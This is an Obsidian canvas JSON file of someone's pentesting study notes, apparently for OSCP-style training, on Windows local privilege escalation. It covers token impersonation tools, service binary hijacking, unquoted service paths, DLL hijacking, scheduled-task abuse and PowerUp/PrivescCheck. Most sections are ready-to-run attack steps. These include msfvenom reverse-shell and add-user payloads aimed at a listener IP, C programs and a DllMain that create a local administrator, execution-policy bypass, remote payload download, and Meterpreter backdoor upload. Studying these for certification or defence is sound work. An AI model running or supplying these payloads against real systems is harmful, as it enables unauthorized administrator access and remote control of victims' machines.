{
	"nodes":[
		{"id":"73550e563d6b1484","type":"group","x":-3280,"y":2600,"width":4040,"height":1000,"color":"2","label":"PowerUp.ps1"},
		{"id":"cf18b46ea591d045","type":"text","text":"* Search for Linux Privilege Escalation exploits in web\n* Dump/crack creds to admin/root account\n* Exploiting proceses running (with higher privileges) on the machine.\n\t* inject code to app directly\n\t* replace file/DLL/executable\n\t* `$ msfvenom/Shellter/BDF`, crash service to force restart","x":-4360,"y":-2435,"width":783,"height":455},
		{"id":"917c444fe4b984b9","type":"link","url":"https://github.com/m0nad/awesome-privilege-escalation?tab=readme-ov-file","x":-3520,"y":-2435,"width":1466,"height":1275},
		{"id":"f8d70663d931cad5","type":"link","url":"https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html","x":-1995,"y":-2435,"width":1466,"height":1275},
		{"id":"2df3e446a12aae91","type":"link","url":"https://github.com/xXxhagenxXx/OSCP_Cheat_sheet/blob/main/Windows%20Privilege%20Escalation%20Techniques.md","x":-440,"y":-2435,"width":1466,"height":1275},
		{"id":"200a4d32ca0cb348","type":"text","text":"# Manual PrivEsc\n","x":-4568,"y":271,"width":560,"height":100},
		{"id":"9579838e26e63ada","type":"text","text":"# SeImpersonatePrivilege - Access Token Impersonation\nhttps://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md\n## JuicyPotatoNG\nhttps://github.com/antonioCoco/JuicyPotatoNG\n```powershell\n.\\JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami > C:\\Users\\chris\\Desktop\\juicypotatong.txt \"\n```\n## PrintSpoofer\nhttps://github.com/itm4n/PrintSpoofer\n```powershell\nPS> .\\PrintSpoofer64.exe -i -c cmd\n```\n## $ msf>incognito module\n\nImpersonate user tokens when successfully compromising a system.\n\nOnce you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes\n\n```PowerShell\nmsf> load incognito # load module \"incognito\"\nmsf> list_tokens -u  # Lists all accessible tokens and their privilege level\nmsf> impersonate_token <token> # \"ATTACKDEFENSE\\\\Administrator\"\nmsf> getuid\n```\n\n\nWindows access tokens are a core element of the authentication process on Windows and are created and managed by the **Local Security Authority Subsystem Service (LSASS)**.\n\nAccess tokens are generated by the winlogon.exe (login page) process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process.  \n\nThis token is then attached to the userinit.ex (proces używany do uruchamiania innych procesów) process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.\n\nAn access token will typically be assigned one of the following security levels:\n\n- **Impersonate-level tokens** are created as a direct result of a **non-interactive login on Windows**, typically through specific system services or domain logons.\n- **Delegate-level tokens** are typically created through an **interactive login on Windows**, primarily through a traditional login or through remote access protocols such as RDP.\n\nImpersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.  \nDelegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.\n\nThe following are the **privileges that are required** for a successful impersonation attack:\n\n- **SeImpersonatePrivilege**: This allows a user to create a process under the security context of another user typically with administrative privileges.\n\nDodatkowe\n- **SeAssignPrimaryToken**: This allows a user to impersonate tokens.\n- **SeCreateToken**: This allows a user to create an arbitrary token with administrative privileges.\n\n","x":-2246,"y":271,"width":820,"height":589},
		{"id":"19d953d0588af09d","type":"text","text":"# Privilege Escalation via App / Windows Service \nlong-running background executable or application managed by the Service Control Manager. It is comparable to daemons on Unix-based systems.\n\nWindows services can be managed through:\n1. Services snap-in\n2. PowerShell\n3. Command-line tool (sc.exe)\n\nUser Accounts for Windows Services:\n1. LocalSystem (includes SIDs for NT AUTHORITY\\SYSTEM and BUILTIN\\Administrators)\n2. Network Service\n3. Local Service\n\nUsers or programs that create services can choose from these accounts, a domain user, or a local user to run the service.\n## Key Privilege Escalation Vectors:\n\n1. **Hijack service binaries**: Substituting or manipulating a service's binary to execute malicious code.\n1. **Hijack service DLLs**: Exploiting DLL search order hijacking to load arbitrary code.\n1. **Abuse unquoted service paths**: Taking advantage of improperly quoted paths in service configurations to execute malicious binaries.\n\nWindows services provide a fertile ground for privilege escalation techniques, making them a crucial area to analyze during security assessments.\n\n","x":-1262,"y":-30,"width":3002,"height":730},
		{"id":"9a2158603ccdf330","type":"text","text":"# Privileges\nlist of windows privilege abuses - https://github.com/gtworek/Priv2Admin","x":-2246,"y":-30,"width":820,"height":210},
		{"id":"92548e5ac6cbe87e","type":"text","text":"# Kernel\n\n## Windows-Exploi-Sugester\n\n**OLD**: https://github.com/AonCyberLabs/Windows-Exploit-Suggester\n\n**NEW**: https://github.com/bitsadmin/wesng\n\n## $ windows-privesc-check\n\nkali linux package\n\n## $ msf>local_exploit_suggester\nwith meterpreter session\n","x":-3218,"y":-30,"width":820,"height":493},
		{"id":"e29673239374cba8","type":"link","url":"https://pentestlab.blog/2017/04/04/dll-injection/","x":1840,"y":-30,"width":800,"height":1030},
		{"id":"4dc88913e91625b1","type":"text","text":"# BackupOperator\nhttps://github.com/improsec/BackupOperatorToolkit","x":-2246,"y":920,"width":820,"height":160},
		{"id":"902e8719a11cf33d","type":"text","text":"# Privilege Escalation via Exploits\n1. **Application-based vulnerabilities**: Installed applications might have vulnerabilities that, when exploited, can allow privilege escalation if the application runs with elevated permissions. \n2. **Windows Kernel vulnerabilities**: Kernel vulnerabilities can lead to privilege escalation, but they require advanced knowledge of Windows. Kernel exploits should be used cautiously to avoid crashing the system.\n3. **Abusing Windows privileges**: Certain privileges, like SeImpersonatePrivilege, can be abused for privilege escalation. For example, the **SigmaPotato** tool can be used to impersonate privileged accounts through a controlled named pipe.","x":4080,"y":-30,"width":1305,"height":350},
		{"id":"af9146fa303142ed","type":"text","text":"## cmd:> WCE.exe\n```powershell\nmeterpreter> execute -i -f wce.exe -a -h # Windows Credentials Editor\n```","x":5440,"y":-30,"width":811,"height":239},
		{"id":"4fe1c0823dd0a5a6","type":"text","text":"# Privilege Escalation via Scheduled Tasks\n**Key Information to Gather:**\n1. User Account (Principal)\nDetermine if the task runs with elevated privileges (e.g., _NT AUTHORITY\\SYSTEM_ or _admin account_).\n2. Triggers\n Check the conditions when the task runs (e.g., at login, time-based, event-based).\n3. Actions\nIdentify the executable or script run by the task.\n\n## Execute\n### 1. Enumerate Scheduled Tasks\n```powershell\ncmd> schtasks /query /fo LIST /v\n\nPS> schtasks /query /fo LIST /v | Select-String -Pattern \"TaskName|Task To Run|Run As User|Next Run Time\"\n\n```\nLook for:\n- **Run As User**: Elevated user account (e.g., _daveadmin_).\n- **Task To Run**: Path to executable (e.g., `BackendCacheCleanup.exe`).\n- **Next Run Time**: Frequency or one-time run.\n### 2. Check Permissions\n```powershell\ncmd> icacls C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe\n```\n### 3. Replace Binary and Make Task Run\nReplace the original binary with a malicious executable (e.g., adduser.exe). \n### 4. Verify Privilege Escalation\n```powershell\nPS> net user \nPS> net localgroup administrators\n```\n","x":2720,"y":-30,"width":1305,"height":1070},
		{"id":"e0ec37d7f4497d95","type":"text","text":"# Service Binary Hijacking\nFor this section, let's consider a scenario in which a software developer creates a program and installs an application as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group. As a result, a lower-privileged user could replace the program with a malicious one. To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as _LocalSystem_.\n\nTo get a list of all installed Windows services, we can choose various methods such as the GUI snap-in _services.msc_, the _Get-Service_ Cmdlet, or the _Get-CimInstance_ Cmdlet (superseding _Get-WmiObject_).\n\n*When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a \"permission denied\" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.*\n## 1. Locate running services\n```powershell\n# Get list of installed services\nPS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}\n\nName                      State   PathName\n----                      -----   --------\nApache2.4                 Running \"C:\\xampp\\apache\\bin\\httpd.exe\" -k runservice\nmysql                     Running C:\\xampp\\mysql\\bin\\mysqld.exe --defaults-file=c:\\xampp\\mysql\\bin\\my.ini mysql\n...\n```\n## 2. Get permissionss\n```Powershell\n# enumerate the permissions on service binaries\ncmd>/PS> icacls \"C:\\xampp\\apache\\bin\\httpd.exe\"\nPS> Get-ACL \"C:\\xampp\\apache\\bin\\httpd.exe\"\n```\n|Mask|Permissions|\n|---|---|\n|F|Full access|\n|M|Modify access|\n|RX|Read and execute access|\n|R|Read-only access|\n|W|Write-only access|\n\n### Script to list services and its permissions (test)\nautomaticaly find voulnerable services\n**Search for (M) - modify**\n```powershell\n# Get running services\n$services = Get-CimInstance -ClassName win32_service | \n            Select-Object Name, State, PathName \n# Iterate through each service and retrieve its ACL\nforeach ($service in $services) {\n    # Check if the path to the executable is not empty and the file exists\n    if ($service.PathName -and (Test-Path $service.PathName)) {\n        # Output the service name\n        Write-Output \"Service: $($service.Name)\"\n        \n        # Get the ACL for the executable file\n        $acl = icacls $service.PathName\n        \n        # Output the ACL\n        $acl\n        Write-Output \"`n\"  # Add a newline for readability\n    } else {\n        Write-Output \"Service: $($service.Name) - No valid path found or file does not exist.\"\n    }\n}\n\n\n\n# Get all services on the host\n$services = Get-CimInstance -ClassName win32_service | \n            Select-Object Name, State, PathName, StartName\n            \n$regex = '([c-zC-Z]:\\\\[^ ]+\\.exe)'\nforeach ($service in $services) {\n    Write-Output \"Service: $($service.Name)   |   State: $($service.State)   |   StartName: $($service.StartName)\"\n    Write-Output \"PathName: $($service.PathName)\"\n    $matches = [regex]::Matches($service.PathName, $regex)\n\tWrite-Output \"`n\"\n\tforeach ($match in $matches) {\n\t\ticacls $match\n\t\t}    \n    Write-Output \"----------------------------------------------------------------------------\"\n}\n\n\n\n```\n\n## 3. Hijack binary\n### 3.1. Create malicious binary \n#### Automatic\n```bash\n$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f exe -o mysqld.exe # reverse shell\n```\n```bash\n$ msfvenom -p windows/adduser USER=privesc PASS=\"123qwe\\!@#QWE\" -f exe -o msf.exe # Create a new user and add them to local administration group\n```\n#### Manual\n\n\ncreate a user named _dave2_ and add that user to the local Administrators group using the _system_[5](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/leveraging-windows-services-185051/service-binary-hijacking-45284#fn-local_id_239-5) function.\n\n```C\n#include <stdlib.h>\nint main ()\n{\n  int i;\n  i = system (\"net user dave2 password123! /add\");\n  i = system (\"net localgroup administrators dave2 /add\");\n  return 0;\n}\n```\n```bash\n# cross-compile the code\n$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n```\n### 3.2. Transfer our malicious binary  to our target and replace the original binary\n### 3.3 Run service\n```Powershell\n# check the Startup Type of the mysql service\nPS> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}\n# Auto, meaning it will start automatically after a reboot\n```\n```Powershell\nStart-Service <Service_Name> # start service\nStop-Service <Service_Name> # stop service\n\nsc.exe start auditTracker # start service\nsc.exe stop auditTracker # stop service\n\nnet start mysql # start service\nnet stop mysql # stop service\n\nRestart-Service <Service_Name>\n\n# In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege\ncmd> whoami /priv\n# reboot host\ncmd> shutdown /r /t 0\n```","x":-1262,"y":940,"width":1023,"height":1485},
		{"id":"297b6dad437cf1a8","type":"text","text":"# Abuse unquoted service paths\nwell-known privilege escalation vector\n\nThe vulnerability arises when the path to a service executable contains spaces but is not properly enclosed in quotes. This allows an attacker with write permissions to certain directories in the service path to insert a malicious executable, which is then executed with elevated privileges when the service starts.\n\n## Key Concepts\n\n- **Unquoted Service Paths**: If a service executable path like `C:\\Program Files\\My Program\\My Service\\service.exe` is unquoted, Windows will attempt to resolve this path in a left-to-right manner. \n\t```\n\tC:\\Program.exe\n\tC:\\Program Files\\My.exe\n\tC:\\Program Files\\My Program\\My.exe\n\tC:\\Program Files\\My Program\\My service\\service.exe\n\t```\n    \n- **CreateProcess Function**: This function is used to start services and applications in Windows. If the file path to the executable is ambiguous (contains spaces without quotes), the function might execute unintended programs.\n    \n\n## Steps to Exploit the Vulnerability\n\n### 1. Identify Unquoted Service Paths\nYou can use `wmic service` to list services and check for those whose executable paths contain spaces but are missing quotes.\n    ```powershell\n\tcmd> wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n    ```\n### 2. Check Permissions\n```powershell\nPS> icacls \"C:\\\"\nPS> icacls \"C:\\Program Files\"\nPS> icacls \"C:\\Program Files\\Enterprise Apps\"\n```\n```powershell\nPS C:\\Users\\damian> icacls \"C:\\Enterprise Software\\Monitoring Solution\"\nC:\\Enterprise Software\\Monitoring Solution CLIENTWK221\\damian:(OI)(CI)(RX,W) <=== Look for W\n                                           BUILTIN\\Administrators:(OI)(CI)(F)\n                                           NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                                           BUILTIN\\Users:(OI)(CI)(RX)\n   ```\n   to check if the user has write permissions in any of the directories where the system might mistakenly look for the executable.\n### 3. Check if we can start and stop the identified service\n```Powershell\nPS> C:\\Users\\steve> Start-Service <Service_Name>\nPS> C:\\Users\\steve> Stop-Service <Service_Name>\n```\n### 4. Create and Replace Malicious Executable\nCompile or use an existing payload (such as one that creates a new local administrator account). Place this executable in one of the writable directories identified in the previous step.\n```bash\n$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f exe -o mysqld.exe # reverse shell\n$ msfvenom -p windows/adduser USER=privesc PASS=\"123qwe\\!@#QWE\" -f exe -o msf.exe # Create a new user and add them to local administration group\n```\n    \n### 5.Restart the Vulnerable Service\nUse `Start-Service` to start the service and trigger the execution of your malicious payload.\n```Powershell\nStart-Service <Service_Name> # start service\nStop-Service <Service_Name> # stop service\n\nsc.exe start auditTracker # start service\nsc.exe stop auditTracker # stop service\n\nnet start mysql # start service\nnet stop mysql # stop service\n\nRestart-Service <Service_Name>\n\n# In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege\ncmd> whoami /priv\n# reboot host\ncmd> shutdown /r /t 0\n```\n    \n\n","x":-191,"y":940,"width":881,"height":1000},
		{"id":"4980c457b9897069","type":"text","text":"# $ msf > trusted_service_path\n```bash\nmsf> use exploit/windows/local/trusted_service_path \n```\n# $ wmic\n```Powershell\nC:\\> wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # search for service with unquoted service path\n```\n# exploit \n```powershell\n# confirm if you can start/stop service without errors\ncmd> sc stop <service_name> # stop service\ncmd> sc start <service_name> # start service\ncmd> sc qc <service_name> # confirm if service will run as local system account\ncmd> icacls <folder_name> # check folder permisions (one that allow for exploiting Unquoted Service Paths), search for (M) modify permision\nmeterpreter> upload <backdor.exe> # upload msfvenom backdor to folder, change name to proper\n```\n```bash\nmeterpreter> run multi/handler\nmeterpreter> set AutoRunScript migrate -n svchost.exe # auto migrate payload to other proces for stability after getting shell\n```","x":-191,"y":1975,"width":881,"height":450},
		{"id":"13c51af7eadc0036","type":"text","text":"# powerup.ps1_ Service_Binary_Hijacking\n**we should never blindly trust or rely on the output of automated tools**\n\n```powershell\nPS> powershell -ep bypass\nPS> . .\\PowerUp.ps1\nPS> Get-ModifiableServiceFile\n\n# The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group. \n```","x":-1262,"y":2620,"width":1023,"height":320},
		{"id":"4f8776bede905383","type":"text","text":"# DLL Hijacking / Preloading/ Insecure Library Loading\nDLL Hijacking allows us the ability to abuse a built-in behavior in the way that executables, when launched, search for Dynamic Link Libraries (DLL’s) to import.\nReplacing service binaries is a common privilege escalation method on Windows, but it requires administrative permissions. A more advanced method is DLL hijacking, which exploits how Windows services load Dynamic Link Libraries (DLLs).\n## DLL Hijacking Methods \n### 1. Overwriting a DLL\nInstead of replacing the service binary, you overwrite a DLL that the service depends on. This may result in code execution, allowing the creation of a new local admin user. \n### 2. Hijacking DLL Search Order \nMicrosoft's safe DLL search mode prevents hijacking by altering the search order. However, if a service attempts to load a missing DLL, placing a malicious DLL in its search path can lead to code execution. \n#### DLL Search Order (Microsoft Standard) \nWhen a program is launched, the DLL Search Order in most cases is as follows: \n1. The directory from which the application was launched \n2. The `C:\\Windows\\System32` directory \n3. The 16-bit Windows system directory (i.e, `C:\\windows\\system`) \n4. The Windows directory (`C:\\windows`) \n5. The current directory at the time of execution \n6. Any directories specified by the `%PATH%` environment variable\n## How To\n### 1. Enumerate installed applications\n```powershell\n# enumerate installed applications\nPS> Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n```\n### 2. Filter for process and dll files\nUse Process Monitor to display real-time information about suspected process.\n\nRun `procmon` app form `SysInternals`. Create a `procmon` filter for name of a specific executable we'd like to investigate, (in this case `RegSrvc.exe`), (optional, and also, create a filter for “NAME NOT FOUND?” for the `Result` column so we can quickly filter on relevant entries.)\n### 3. Run binary to catch activity with procmon.exe, find NAME NOT FOUND\nIf targeting service then launch `Services` app and find service using required executable (\"RegSrvc.exe\").\nStop and start service or run program. \nProcess monitor (`procmon`) catches what is happening. Identify cases where the application is looking for a DLL in a directory which we can write to, or modify.  \n\noperation _CreateFile_ is responsible for not only creating files but also accessing existing files.\n\nCan filter for `Result is NAME NOT FOUND`\n\n```powershell\nPS> Get-ACL 'C:\\Users\\Administrator\\Desktop\\dvta\\bin\\Release' | Format-List # verify that we can write the DLL to the DVTA directory\n```\n\n### 4. Create dll file and transfer to selected path\n#### Automatic\n```bash\n$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f exe -o mysqld.exe # reverse shell\n$ msfvenom -p windows/adduser USER=privesc PASS=\"123qwe\\!@#QWE\" -f exe -o msf.exe # Create a new user and add them to local administration group\n```\n#### Manual\n```C\n#include <stdlib.h>\n#include <windows.h>\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n  \t    i = system (\"net user dave3 password123! /add\");\n  \t    i = system (\"net localgroup administrators dave3 /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n```\n```bash\n$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll # compile dll file\n```\n#### Transfer\nDrop our modified payload in the writable directory.\n\n```powershell\nPS> iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll' # transfer file to specified folder\n```\n### 5. Run application/service\nIn order for the DLL hijacking to trigger the app needs to be started.\n\nRestart the Service, re-launch the application, or wait for the system to be rebooted in the case the executable is in fact associated with a service that starts at boot time, or, alternatively, wait for the user to launch the affected application.\n\nIt is important to keep in mind that **the privileges the DLL will run with depend on the privileges used to start the application**.\n\n\n\n```Powershell\nStart-Service <Service_Name> # start service\nStop-Service <Service_Name> # stop service\n\nsc.exe start auditTracker # start service\nsc.exe stop auditTracker # stop service\n\nnet start mysql # start service\nnet stop mysql # stop service\n\nRestart-Service <Service_Name>\n\n# In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege\ncmd> whoami /priv\n# reboot host\ncmd> shutdown /r /t 0\n```\n\n\n","x":760,"y":940,"width":980,"height":1485},
		{"id":"0d3eb582423b40b7","type":"text","text":"# Automatic PrivEsc Identyfying\n","x":-4568,"y":3680,"width":560,"height":100},
		{"id":"241df2a70651f9fb","type":"text","text":"# powerup.ps1_Abuse_unquoted_service_paths\n\n**PowerUp** is a PowerShell module designed to automate privilege escalation tasks, including identifying and exploiting unquoted service paths. The `Get-UnquotedService` function can scan for vulnerable services, and `Write-ServiceBinary` can be used to automatically inject the malicious executable.\n```powershell\nPS> . .\\PowerUp.ps1\nPS> Get-UnquotedService\nPS> Write-ServiceBinary -Name 'GammaService' -Path \"C:\\Program Files\\Enterprise Apps\\Current.exe\"\nPS> Restart-Service GammaService # or reboot host\n\n# In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege\ncmd> whoami /priv\n# reboot host\ncmd> shutdown /r /t 0\n```\ndefault behavior is to create a new local user called _john_ with the password _Password123!_. Additionally, the user is added to the local _Administrators_ group.","x":-191,"y":2620,"width":881,"height":480},
		{"id":"11ecd28201dbaab0","type":"text","text":"# powerup.ps1_ Service_Abuse\n\n```powershell\nInvoke-ServiceAbuse [-Name] <String[]> [-UserName <String>] [-Password <String>] [-LocalGroup <String>] [-Credential <PSCredential>] [-Command <String>] [-Force]\n```\n```powershell\n# add a localuser \"john\" with password \"Password123! to the machine and local administrator group\nInvoke-ServiceAbuse\n ```\n```powershell\n# create a new user with administrator access on the target machine\nPS> Invoke-ServiceAbuse -Name AppReadiness  -UserName <username> -Password <passwd> -LocalGroup \"Administrators\" \n```\n```powershell\n# execute command\nPS> Invoke-ServiceAbuse -Name AppReadiness -Command \"net user\" \n```\n```powershell\nPS> sc stop AdvancedSystemCareService9 # stop service\nPS> sc start AdvancedSystemCareService9 # start service\n```","x":-1262,"y":3100,"width":1023,"height":460},
		{"id":"7634a438feee9b3c","type":"link","url":"https://blog.certcube.com/powerup-cheatsheet/","x":-2398,"y":2720,"width":400,"height":400},
		{"id":"101c666797090709","type":"text","text":"# PS> PowerUp.ps1\n\n## Check for available privesc\nprogram that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities.\nhttps://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f\n```PowerShell\nPS> /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 # PowerUp.ps1 location\n```\n```powershell\nPS> powershell -ep bypass # PowerShell execution policy bypass\n```\n```powershell\nPS> Import-Module .\\PowerUp.ps1 # import module\nPS> . .\\PowerUp.ps1 # Import PowerUp.ps1 script\n```\n```powershell\nPS> Invoke-PrivescAudit # run function, formerly Invoke-AllChecks\n```\n```powershell\npowershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-PrivescAudit\"\n```\n\n**probably optional**\ndisable AMSI (probably hasn’t been patched by Microsoft)\n[[AMSI]]\n\n","x":-3218,"y":2620,"width":820,"height":640},
		{"id":"7fd30da60a92227a","type":"text","text":"# PS> PrivescCheck.ps1\nPrivilege Escalation Enumeration Script for Windows\nhttps://github.com/itm4n/PrivescCheck\n\n```PowerShell\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\nrunas.exe /user:administrator cmd\n```\n```powershell\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML\"\n```\n```powershell\npowershell -ep bypass -c \". \\\\192.168.45.160\\b\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML\"\n```\n```powershell\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML,TXT,CSV,XML\"\n```\n","x":-3280,"y":3920,"width":900,"height":420}
	],
	"edges":[
		{"id":"a3e4ce5a55162a18","fromNode":"19d953d0588af09d","fromSide":"bottom","toNode":"e0ec37d7f4497d95","toSide":"top"},
		{"id":"33646776200500db","fromNode":"19d953d0588af09d","fromSide":"bottom","toNode":"4f8776bede905383","toSide":"top"},
		{"id":"90a053e879119c83","fromNode":"19d953d0588af09d","fromSide":"bottom","toNode":"297b6dad437cf1a8","toSide":"top"},
		{"id":"bded36196534a3bc","fromNode":"e0ec37d7f4497d95","fromSide":"bottom","toNode":"13c51af7eadc0036","toSide":"top"},
		{"id":"2ac0305b8f3b447f","fromNode":"297b6dad437cf1a8","fromSide":"bottom","toNode":"241df2a70651f9fb","toSide":"top"},
		{"id":"e920a75ab0effdf9","fromNode":"297b6dad437cf1a8","fromSide":"bottom","toNode":"4980c457b9897069","toSide":"top"},
		{"id":"754d5979dd79637b","fromNode":"0d3eb582423b40b7","fromSide":"right","toNode":"101c666797090709","toSide":"left"},
		{"id":"55e7ba11fadf70c7","fromNode":"0d3eb582423b40b7","fromSide":"right","toNode":"7fd30da60a92227a","toSide":"left"},
		{"id":"92820280c4676dbb","fromNode":"101c666797090709","fromSide":"right","toNode":"13c51af7eadc0036","toSide":"left"},
		{"id":"d9166aefb9ad3c63","fromNode":"101c666797090709","fromSide":"right","toNode":"241df2a70651f9fb","toSide":"left"},
		{"id":"1f664346f5d4f5bb","fromNode":"7634a438feee9b3c","fromSide":"left","toNode":"11ecd28201dbaab0","toSide":"left"}
	]
}